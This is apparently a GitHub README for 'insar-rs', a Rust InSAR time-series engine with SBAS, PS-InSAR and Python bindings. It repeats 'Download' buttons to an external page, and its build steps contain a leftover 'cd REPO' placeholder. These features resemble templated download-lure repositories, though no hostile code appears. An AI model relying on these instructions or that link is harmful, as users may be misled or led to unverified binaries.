# insar-rs v0.1 - InSAR time-series analysis engine 2026

> **Rust-powered InSAR time-series processing for Sentinel-1 and adjacent workflows, bringing together SBAS, PS-InSAR, and Python integration in version 0.1.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/edwardsjason2001/insar-rs-v01-engine?style=flat-square)](https://github.com/edwardsjason2001/insar-rs-v01-engine)

---

<p align="center">
  <a href="https://edwardsjason2001.github.io/insar-rs-v01-engine/">
    <img src="https://img.shields.io/badge/Download-insar-rs%20Latest-brightgreen?style=for-the-badge" alt="Download insar-rs">
  </a>
</p>

> **[Direct Download - insar-rs v0.1](https://edwardsjason2001.github.io/insar-rs-v01-engine/)**

---

[Download Latest Build](https://edwardsjason2001.github.io/insar-rs-v01-engine/)

---

## Overview

insar-rs is a Rust engine created for InSAR time-series analysis, with support for deformation studies built around SBAS and PS-InSAR-style workflows. It is structured to carry the data path from stack ingestion to usable surface motion products, while remaining practical for both CLI usage and Python-centered pipelines.

The repository targets Sentinel-1 interferometry users, along with engineers and researchers who want reusable processing pieces for correction, inversion, and feature extraction. With a native Rust core and pyo3 bindings, it is positioned for performance-conscious workloads without leaving Python-based environments behind.

---

## Capabilities

- Small-Baseline Subset (SBAS) inversion for time-series reconstruction
- Persistent Scatterer candidate selection for PS-InSAR workflows
- ISCE stack reading with native I/O support
- Phase unwrapping with optional SNAPHU backend integration
- Closure-based unwrap error correction for improved consistency
- Coherence-weighted and robust inversion methods
- Atmospheric and tropospheric correction support
- LOS to Up/East decomposition and pixel feature extraction for ML-oriented use

---

## Installation

Clone the repository and build it with Cargo:

```bash
git clone https://github.com/edwardsjason2001/insar-rs-v01-engine.git
cd REPO
cargo build --release
```

If you intend to use the Python interface, compile the bindings in the same environment where your Python dependencies are installed. Once the build completes, you can run the CLI binary from `target/release` or import the generated module from your Python workflow, depending on your integration model.

---

## Usage

A common workflow begins by preparing an interferometric stack, loading the source data, and then selecting the analysis route that matches the study objective.

Example CLI flow:

```bash
insar-rs --help
insar-rs run --stack path/to/stack --method sbas
insar-rs run --stack path/to/stack --method ps
```

Example processing outline:

1. Load the stack through the native reader.
2. Run phase unwrapping, using SNAPHU when configured.
3. Apply closure-based unwrap correction if needed.
4. Choose SBAS inversion or persistent-scatterer selection.
5. Apply atmospheric or tropospheric corrections.
6. Export line-of-sight results or LOS-to-Up/East decomposition outputs.

For Python usage, import the binding layer from your analysis code and connect it to your existing data preparation or visualization scripts.

---

## Configuration

You will usually control settings through command-line flags or the Python interface, depending on how you execute the engine. When a configuration file is part of the deployment, keep it next to the stack inputs so the processing setup stays reproducible.

Example structure:

```toml
[processing]
method = "sbas"
use_snaphu = true
apply_atmospheric_correction = true
apply_tropospheric_correction = true
decompose_los = true
```

Tune the options to fit the stack format, inversion path, and correction approach you are using.

---

## Requirements

- Rust toolchain for building the core engine
- A system capable of handling InSAR stack processing workloads
- Sentinel-1 or compatible interferometric data inputs for time-series analysis
- Optional SNAPHU backend if you want external phase unwrapping support
- Python environment only if you plan to use the pyo3 bindings
- Sufficient storage for stack files, intermediate products, and output rasters

---

## FAQ

**How do I move to a later version?**  
Fetch the newest repository changes, rebuild the project, and then rerun your workflow with the updated binary or binding package.

**Where is processing behavior configured?**  
Most runtime behavior is driven by command-line arguments or the Python entry point. If you rely on a config file, keep inversion, correction, and output settings there so they stay in one place.

**What happens if unwrapping needs an external backend?**  
The engine can be paired with an optional SNAPHU backend, so make sure that backend is installed and correctly referenced in your workflow.

**Is Python supported?**  
Yes. The project provides pyo3-based Python bindings for use in Python analysis environments.

**Which workflows is it intended for?**  
It is built around InSAR time-series analysis, including SBAS inversion, PS-InSAR candidate selection, corrections, and deformation-oriented outputs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
